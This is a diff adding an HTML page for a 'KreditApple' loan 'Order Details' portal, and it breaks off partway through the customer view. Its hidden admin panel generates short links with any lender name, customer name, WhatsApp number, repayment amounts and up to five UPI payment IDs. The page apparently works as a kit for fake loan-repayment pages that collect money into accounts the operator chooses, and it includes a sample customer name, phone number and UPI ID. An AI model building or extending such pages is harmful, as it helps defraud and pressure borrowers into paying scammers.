@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Order Details - KreditApple</title>
+<script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex justify-center items-center min-h-screen m-0">
+
+<div class="w-full max-w-md bg-white shadow-xl min-h-screen flex flex-col justify-between pb-6" id="mainApp">
+  <!-- Admin Panel View (Default if no params) -->
+  <div id="adminView" class="hidden">
+    <div class="bg-[#2196F3] text-white px-4 py-4 text-center font-bold text-base shadow">Admin Panel - Link Generator</div>
+    <div class="p-4 space-y-3 overflow-y-auto">
+      <div class="grid grid-cols-2 gap-2">
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Business Name</label>
+          <input id="in_biz" value="Fairbalancea" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Logo Letter</label>
+          <input id="in_logo" value="F" maxlength="2" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+      </div>
+      
+      <label class="text-xs font-bold block text-gray-700">Customer Name</label>
+      <input id="in_name" value="Umar ali" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <label class="text-xs font-bold block text-gray-700">Customer Mobile (WhatsApp)</label>
+      <input id="in_mobile" value="91750000058" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <div class="grid grid-cols-2 gap-2">
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Waiting Text / Days</label>
+          <input id="in_days" value="0 Days left" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Repayment Date</label>
+          <input id="in_date" type="date" value="2026-11-14" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+      </div>
+      
+      <div class="grid grid-cols-2 gap-2">
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Extension (₹)</label>
+          <input id="in_ext" type="number" value="2400" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+        <div>
+          <label class="text-xs font-bold block text-gray-700">Full Repay (₹)</label>
+          <input id="in_full" type="number" value="6000" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+        </div>
+      </div>
+
+      <label class="text-xs font-bold block text-gray-700">Channel 1 UPI (Required)</label>
+      <input id="in_upi1" value="bharatpe.90065511470@fbpe" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <label class="text-xs font-bold block text-gray-700">Channel 2 UPI (Optional)</label>
+      <input id="in_upi2" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <label class="text-xs font-bold block text-gray-700">Channel 3 UPI (Optional)</label>
+      <input id="in_upi3" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <label class="text-xs font-bold block text-gray-700">Channel 4 UPI (Optional)</label>
+      <input id="in_upi4" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <label class="text-xs font-bold block text-gray-700">Channel 5 UPI (Optional)</label>
+      <input id="in_upi5" placeholder="Optional" class="w-full p-3 border rounded-lg text-sm bg-gray-50">
+      
+      <button onclick="makeLink()" class="w-full bg-[#0083b0] text-white py-3 rounded-full font-bold mt-3 shadow hover:bg-[#006e94]">Generate Short Link</button>
+      <div id="out"></div>
+    </div>
+  </div>
+
+  <!-- Customer Portal View -->
+  <div id="customerView" class="hidden flex flex-col min-h-screen justify-between">
+    <div>
+      <div class="bg-[#2196F3] text-white px-4 py-3 flex justify-between items-center text-sm font-medium">
+        <span>Order Details</span>
+        <a href="#" class="hover:underline">Go borrow money >></a>
+      </div>
+
+      <div class="p-4 space-y-4">
+        <div class="flex items-center justify-between border-b pb-3">
+          <div class="flex items-center space-x-3">
+            <div class="bg-[#1e3d30] p-2 rounded-xl text-white font-
